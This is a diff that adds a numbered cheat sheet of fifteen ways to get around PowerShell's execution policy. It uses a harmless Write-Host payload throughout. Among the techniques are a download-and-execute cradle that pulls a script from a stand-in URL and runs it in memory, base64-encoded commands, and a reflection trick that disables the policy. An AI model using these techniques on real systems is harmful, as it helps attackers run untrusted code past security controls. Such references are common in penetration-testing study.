@@ -1,0 +1,70 @@
+==> VIEW THE EXECUTION-POLICY
+
+PS C:\> Get-ExecutionPolicy
+PS C:\> Get-ExecutionPolicy -List | Format-Table -AutoSize
+PS C:\> Write-Host "My voice is my passport, verify me."
+
+-------------------------------------------------------------------------------
+
+1. Simple & Basic
+PS C:\> write-host "My voice is my passport."
+
+2. Echo the Script and Pipe it to PowerShell Standard In
+C:\> Echo Write-Host "My voice is my passport, verify me."  | PowerShell.exe -noprofile -
+
+3.a) Read Script from File and Pipe to PowerShell Standard In (reads from disc)
+PS C:\> Get-Content .\runme.ps1 | PowerShell.exe -noprofile -
+
+  b) Type command
+  PS C:\> TYPE .\runme.ps1 | PowerShell.exe -noprofile -
+  
+4. Download Script from URL and Execute with Invoke Expression (in memory)
+PS C:\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://www.blah.com/some_script')"
+
+5.a) Command Switch
+PS C:\> Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+
+  b) Short command
+  PS C:\> Powershell -c "Write-Host 'My voice is my passport, verify me.'"
+
+6.a) Use the EncodeCommand Switch
+PS C:\> $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+
+  b) Short command 
+  PS C:\> powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
+
+7.a) Use Invoke-Command (can be used to execute commands against remote systems where PowerShell remoting has been enabled)
+PS C:\> invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
+
+  b) Can also be used to grab the execution policy from a remote computer and apply it to the local computer
+  PS C:\> invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
+  
+8. Use Invoke-Expression
+  a) Full command using Get-Content
+  PS C:\> Get-Content .\runme.ps1 | Invoke-Expression
+  
+  b) Short command using Get-Content
+  PS C:\> GC .\runme.ps1 | iex
+  
+9. Use "Bypass" Execution Policy Flag
+PS C:\> PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
+
+10. Use "Unrestricted" Execution Policy Flag
+PS C:\> PowerShell.exe -ExecutionPolicy UnRestricted -File .\runme.ps1
+
+11. Use "Remote-Signed" Execution Policy Flag
+PS C:\> PowerShell.exe -ExecutionPolicy Remote-signed -File .\runme.ps1
+
+12. Disable ExecutionPolicy by Swapping out the AuthorizationManager
+PS C:\> function Disable-ExecutionPolicy
+{($ctx=$executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue($executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx,(new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} Disable-ExecutionPolicy .\runme.ps1
+
+13. Set ExcutionPolicy for the Process Scope
+PS C:\> Set-ExecutionPolicy Bypass -Scope Process
+
+14. Set ExcutionPolicy for the CurrentUser Scope via Command
+PS C:\> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+
+15. Set ExcutionPolicy for the CurrentUser Scope via the Registry
+PS C:\> HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
+
